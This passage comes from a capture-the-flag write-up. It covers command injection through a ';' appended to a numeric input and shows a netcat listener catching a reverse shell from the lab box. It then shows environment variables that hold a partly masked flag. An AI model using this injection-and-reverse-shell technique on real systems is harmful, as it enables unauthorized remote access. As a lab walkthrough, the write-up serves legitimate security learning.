it is very easy to exploit. just put a `;` after the number and type your own command. next i will launch a reverse shell to get access to the machine.

### reverse shell

![image](/images/Pasted image 20221114230143.png)

this is the command i used to execute the shell.

```shell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.1.199] from (UNKNOWN) [10.10.64.230] 36932
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
challenge@e7c1352e71ec:~$ id
id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
challenge@e7c1352e71ec:~$
```

and here i got access to the system.

after checking out all files in the home directory testing for common privileges escalation vectors i found something in the environment variables.

```shell
challenge@e7c1352e71ec:/home$ env
env
HOSTNAME=e7c1352e71ec
PWD=/home
HOME=/home/challenge
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{7da***************************47}
SHLVL=2
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
OLDPWD=/
```

flag found and box done.
